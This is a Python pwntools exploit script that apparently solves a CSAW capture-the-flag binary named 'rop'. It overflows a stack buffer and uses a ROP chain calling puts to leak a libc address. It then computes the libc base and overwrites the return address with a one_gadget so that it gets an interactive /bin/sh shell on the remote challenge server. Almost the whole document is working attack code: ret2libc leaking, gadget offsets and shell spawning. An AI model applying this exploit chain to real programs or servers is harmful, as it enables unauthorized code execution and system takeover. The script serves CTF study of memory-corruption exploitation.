#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'
context.terminal = 'tmux split -h'.split(' ')

exe = ELF("./rop", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.binary = exe

"""
0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""

og_off = 0x10a45c

if args.REMOTE:
    p = remote('pwn.chal.csaw.io', 5016)
else:
    p = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

    if args.GDB:
        gdb.attach(p, '''
            break * 0x400611
            continue
            ''')

padding = b'A' * 0x28

# 1. Leak libc address

rop = ROP(exe.path)
rop.call('puts', [exe.got.puts])
rop.call('main')

payload = padding + rop.chain()

p.sendlineafter(b'Hello\n', payload)

puts_addr = u64(p.recv(6).ljust(8, b'\x00'))

log.info(f'puts @ {hex(puts_addr)}')

# 2. Execute system('/bin/sh')

libc.address = puts_addr - libc.sym.puts
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
og_addr = libc.address + og_off

log.info(f'libc @ {hex(libc.address)}')
log.info(f'system @ {hex(libc.sym.system)}')
log.info(f'/bin/sh @ {hex(bin_sh_addr)}')
log.info(f'og @ {hex(og_addr)}')

ret_addr = 0x000000000040048e

rop = ROP(exe.path)
rop.call(libc.sym.system, [bin_sh_addr])

# payload = padding + rop.chain()
payload = padding + p64(og_addr)

p.sendlineafter(b'Hello\n', payload)

p.interactive()
